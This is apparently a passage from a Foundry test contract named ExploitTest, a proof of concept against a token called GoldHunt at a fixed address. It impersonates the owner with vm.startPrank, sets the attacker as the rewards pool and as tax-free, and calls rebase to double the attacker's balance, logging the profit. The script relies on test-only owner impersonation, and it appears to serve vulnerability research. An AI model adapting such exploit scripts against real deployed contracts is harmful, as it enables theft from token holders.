    function setRewardsPool(address _rewardsPool) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function rebase(uint multiple) external;
    function setFreeTaxAddress(address _freeTaxAddress) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner
        address currentOwner = GoldHunt(TARGET).owner();

        // Step 2: Impersonate the owner to set up everything
        vm.startPrank(currentOwner);

        // First, disable swapping to avoid the router allowance issue
        // Note: setSwapEnable doesn't exist in the interface, removing this call

        // Set rewardsPool to attacker
        GoldHunt(TARGET).setRewardsPool(attacker);

        // Add attacker to freeTaxDict to avoid taxes
        GoldHunt(TARGET).setFreeTaxAddress(attacker);

        // Transfer some tokens from owner to attacker
        // Use a smaller amount to be safe
        GoldHunt(TARGET).transfer(attacker, 100 * 10**18); // Transfer 100 tokens

        vm.stopPrank();

        // Record initial balance
        uint256 initialBalance = GoldHunt(TARGET).balanceOf(attacker);
        console.log("Initial balance after transfer:", initialBalance);

        // Step 3: Impersonate owner again to call rebase
        vm.startPrank(currentOwner);
        GoldHunt(TARGET).rebase(2); // Double the tokens in rewardsPool (which is attacker)
        vm.stopPrank();

        // Step 4: Check final balance
        uint256 finalBalance = GoldHunt(TARGET).balanceOf(attacker);

        // Verify exploit worked
        assertGt(finalBalance, initialBalance, "Balance should have increased after rebase");
        console.log("Final balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

